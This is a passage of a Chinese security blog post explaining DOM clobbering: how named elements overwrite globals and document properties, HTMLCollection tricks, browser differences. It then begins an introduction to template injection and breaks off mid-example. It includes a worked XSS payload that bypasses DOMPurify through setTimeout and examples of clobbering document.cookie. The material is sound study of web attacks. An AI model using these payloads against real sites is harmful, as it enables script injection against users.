<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginForm&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submitBtn&quot;</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">    console.log(loginForm.username); // 输出: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    console.log(loginForm.submitBtn); // 输出: <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submitBtn&quot;</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">  </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>但是这样的话 就没有a标签能使用了  </p>
<p>所以说toString 也无法使用 所以说也就不能使用href去覆盖  </p>
<p>可以尝试去使用<code>value</code>这个属性来进行覆盖  </p>
<p>例如： <code>config.environment.value</code>  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;config&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;enviroment&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(config.<span class="hljs-property">enviroment</span>.<span class="hljs-property">value</span>) <span class="hljs-comment">// test</span></span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>简单来说，只有内置属性可以被覆盖，其他属性不能。  </p>
<p>还有一个可能被利用的点是 <code>HTMLCollection</code>  </p>
<p>这个东西 当返回多个内容时 出现  </p>
<p>例如  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;config&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;config&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(config) <span class="hljs-comment">// HTMLCollection(2)</span></span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>但是我们可以通过相同的id或者是其他属性得到HTMLCollection 然后再往下细分得到特定的某个属性  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;menu&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;link&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;home&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/home&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;link&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;about&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/about&quot;</span>&gt;</span>About<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;link&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;contact&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/contact&quot;</span>&gt;</span>Contact<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 获取 id 为 &quot;link&quot; 的 HTMLCollection</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> links = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;link&quot;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 通过 name 属性访问集合中的特定元素</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(links.<span class="hljs-property">home</span>.<span class="hljs-property">href</span>); <span class="hljs-comment">// 输出: http://当前域名/home</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(links.<span class="hljs-property">about</span>.<span class="hljs-property">href</span>); <span class="hljs-comment">// 输出: http://当前域名/about</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(links.<span class="hljs-property">contact</span>.<span class="hljs-property">href</span>); <span class="hljs-comment">// 输出: http://当前域名/contact</span></span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>但是在firefox里面不是这样的  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;config&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;config&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">    console.log(config) // <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;config&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">  </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>看一个例子</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&lt;!-- Challenge --&gt;&lt;h2 id=&quot;boomer&quot;&gt;Ok, Boomer.&lt;/h2&gt;&lt;script&gt;<br>    boomer.innerHTML = DOMPurify.sanitize(new URL(location).searchParams.get(&#x27;boomer&#x27;) || &quot;Ok, Boomer&quot;)<br>    setTimeout(ok, 2000)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>看这段代码  </p>
<p>先给出payload : <code>&lt;a id=ok href=&quot;tel:alert(1)&quot;&gt;  </code></p>
<p>或者把tel 换成 dompurify这个库里面允许的任何一个协议都行  </p>
<p>构造出这个payload的原因是因为 <code>setTimeout(ok, 2000)</code> </p>
<p>这段代码里面的ok没有被定义  </p>
<p>而settimeout这个函数的第一个参数应该是一个函数名 或者是 一个函数表达式  </p>
<p>通过自己构造出一个名为ok的dom元素  </p>
<p>settimeout函数在执行的时候 会将ok这个dom元素试图转换成一个函数 会发生一个隐式类型转换 转换的过程中会默认调用tostring方法  </p>
<p>又因为使用了<a> 这个标签 遇上tostring方法时 会返回href里面的内容 也就会触发弹窗 </p>
<h4 id="更多的危害"><a href="#更多的危害" class="headerlink" title="更多的危害"></a>更多的危害</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">cookie</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">test</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">name</span>=<span class="hljs-string">lastElementChild</span>&gt;</span>I am first child<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>I am last child<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">name</span>=<span class="hljs-string">getElementById</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">embed</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>) <span class="hljs-comment">// &lt;img name=&quot;cookie&quot;&gt;</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#test&#x27;</span>).<span class="hljs-property">lastElementChild</span>) <span class="hljs-comment">// &lt;div&gt;I am last child&lt;/div&gt;</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">getElementById</span>) <span class="hljs-comment">// &lt;embed name=getElementById&gt;&lt;/embed&gt;</span></span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(document.cookie) <br></code></pre></td></tr></table></figure>

<p>看这行  </p>
<p>原本是应该获取cookie的值的 因为 cookie 被覆盖 所以输出了其他的东西  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(document.getElementById) <br></code></pre></td></tr></table></figure>

<p>甚至<code>document.getElementById</code>也可能被 DOM 覆盖，导致调用<code>document.getElementById()</code>时出错，从而导致整个页面崩溃  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">cookie</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// Assumed we can pollute an attribute to a custom function</span></span><br><span class="language-javascript">    <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-string">&#x27;a=1&#x27;</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`cookie: <span class="hljs-subst">$&#123;<span class="hljs-variable language_">document</span>.cookie&#125;</span>`</span>) <span class="hljs-comment">// cookie: a=1</span></span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>来看这个  </p>
<p>这段代码将<code>Object.prototype.toString</code> 覆盖成了a&#x3D;1  </p>
<p>在 JavaScript 中，几乎所有的对象都继承自 <code>Object.prototype</code>  实际上是在重写所有对象上的 <code>toString</code> 方法  </p>
<p>console.log(<code>cookie: $&#123;document.cookie&#125;</code>)  又因为这句使用了模版字符串 并且里面是<code>document.cookie</code> 这个html属性 而不是一个字符串  </p>
<p>在 JavaScript 中，模板字符串（template literals）是允许嵌入表达式的字符串字面量。当你使用模板字符串时，如果模板中的表达式不是字符串类型，JavaScript 会尝试调用该值的 <code>toString</code> 方法将其转换为字符串  </p>
<p>因此，根据原型链，它最终会调用我们被污染的<code>Object.prototype.toString</code> ，返回被污染的结果</p>
<p><strong>注意</strong>  </p>
<p>这里的document.cookie 不是一个字符串 而是一个html属性 因为 <code>  &lt;img name=cookie&gt;</code>这一行的缘故  </p>
<p>在<code> &lt;img name=cookie&gt;</code> 中，name&#x3D;cookie 是一个 HTML 属性，而 <code>&lt;img&gt; </code>是一个 DOM 元素。</p>
<p>所以说在使用模版字符串的时候会发生隐式调用 去调用tostring方法 所以说会导致输出a&#x3D;1 如果没有&#96;&#96; <img name=cookie><code> </code>  </p>
<p>这玩意 那么 document.cookie 确实是一个字符串 当其嵌入到模版字符串里面的时候也就不会发生 隐式调用 </p>
<h4 id="总结-toString-的调用场景"><a href="#总结-toString-的调用场景" class="headerlink" title="总结 toString() 的调用场景"></a>总结 <code>toString()</code> 的调用场景</h4><p><strong>显式调用</strong>  </p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-keyword">const</span> obj = &#123; name: <span class="hljs-string">&quot;Alice&quot;</span> &#125;;<br>console.<span class="hljs-keyword">log</span>(obj.<span class="hljs-keyword">to</span>String()); // 输出 <span class="hljs-string">&quot;[object Object]&quot;</span><br></code></pre></td></tr></table></figure>

<p><strong>隐式调用</strong>  </p>
<ol>
<li><h5 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a><strong>模板字符串</strong></h5><p>模板字符串在插值 <code>$&#123;...&#125;</code> 中插入值时，如果该值不是字符串类型，JavaScript 会调用 <code>toString()</code> 方法。  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">const obj = &#123; <span class="hljs-attr">toString</span>: <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-string">&quot;Custom String&quot;</span> &#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">`Value: <span class="hljs-subst">$&#123;obj&#125;</span>`</span>); <span class="hljs-comment">// 输出 &quot;Value: Custom String&quot;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>字符串连接操作</strong></p>
</li>
</ol>
<p>当非字符串类型的值与字符串进行连接时，会调用 <code>toString()</code> 方法将其转换为字符串  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">const obj = &#123; <span class="hljs-attr">toString</span>: <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-string">&quot;Custom String&quot;</span> &#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Value: &quot;</span> + obj); <span class="hljs-comment">// 输出 &quot;Value: Custom String&quot;</span><br></code></pre></td></tr></table></figure>

<p>  3.<strong>显式类型转换</strong>  </p>
<p>当使用 <code>String()</code> 将值转换为字符串时，会调用 <code>toString()</code> 方法  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">const obj = &#123; <span class="hljs-attr">toString</span>: <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-string">&quot;Custom String&quot;</span> &#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(String(obj)); <span class="hljs-comment">// 输出 &quot;Custom String&quot;</span><br></code></pre></td></tr></table></figure>

<p>4.<strong>作为对象的字符串表示</strong>  </p>
<p>当对象被期望用作字符串时，例如在 <code>alert()</code> 或 <code>console.log()</code> 中显示对象  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">const obj = &#123; <span class="hljs-attr">toString</span>: <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-string">&quot;Custom String&quot;</span> &#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(obj); <span class="hljs-comment">// 输出 &quot;Custom String&quot;</span><br></code></pre></td></tr></table></figure>

<p>其中的第四点 也不是每种情况都能产生作用  </p>
<p>就比如上面的代码  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501081452962.png" srcset="/img/loading.gif" lazyload alt="image-20250108145249422"></p>
<p>他并没有调用tostring方法 因为这里的cookie已经被作用到全局变量里面了 这行的代码的意思就相当于打印cookie元素  </p>
<h3 id="CSTI-客户端模版注入"><a href="#CSTI-客户端模版注入" class="headerlink" title="CSTI(客户端模版注入)"></a>CSTI(客户端模版注入)</h3><p>先回顾一下ssti  </p>
<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/</a>  </p>
<p><strong>写作的目的主要是希望能将整个漏洞的框架完整的搭建起来（框架也就是所谓的前因后果-&gt;纵向，类比迁移-&gt;横向，探寻方法-&gt;技巧），而不是对漏洞的某一方面的简单陈述，我认为在没有完整的漏洞框架的基础上去单纯地学习怎么利用这种漏洞是没有意义的</strong>  </p>
<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://www.k0rz3n.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a>  </p>
<p>这个系列的其他文章  </p>
<h4 id="ssti-服务端模版注入"><a href="#ssti-服务端模版注入" class="headerlink" title="ssti(服务端模版注入)"></a>ssti(服务端模版注入)</h4><p><strong>什么叫模版引擎</strong>  </p>
<p>模板引擎（Template Engine）是一种程序化的工具，通常用于将数据和HTML代码模板相结合，生成动态内容。它的作用是将 <strong>静态模板</strong>（如HTML文件）和 <strong>动态数据</strong>（如从数据库中获取的内容）结合起来，生成最终的页面。  </p>
<p>模板引擎是一个软件组件，它接受一个模板文件和一些数据， <strong>渲染</strong>（即将数据填充到模板中）并输出生成的内容。  </p>
<p>一个模板通常由 <strong>静态部分</strong>（HTML、CSS）和 <strong>动态部分</strong>（数据插值、逻辑）组成：</p>
<ol>
<li><strong>静态部分</strong>：指不随数据变化而变化的页面部分。通常是 HTML 和 CSS，用于定义页面的结构和样式。</li>
<li><strong>动态部分</strong>：指依赖数据的部分。例如，展示用户信息、数据库查询结果或计算得出的内容。这些部分由模板引擎根据输入的数据生成。</li>
</ol>
<p><strong>什么叫模版渲染</strong>  </p>
<p><strong>模板渲染</strong>是一种编程设计模式，用于将动态数据填充到预定义的模板中，生成最终的结果（通常是 HTML、文本、XML 等）。<br>通俗来说，它是一个 <strong>“数据+模板&#x3D;最终页面”</strong> 的过程。  </p>
<p>模板是一个带有占位符或变量的文件或字符串，用于定义页面的结构和静态内容  </p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">title</span> &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">name</span> &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<p><code>&#123;&#123; title &#125;&#125;</code> 和 <code>&#123;&#123; name &#125;&#125;</code> 是占位符。</p>
<p>这些占位符在渲染时会被动态数据替换成具体的值。  </p>
<p>可以将<code>&#123;&#123;&#125;&#125;</code>内的内容视为模板引擎将为您执行的代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><br>data = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Peter&quot;</span>,<br>    <span 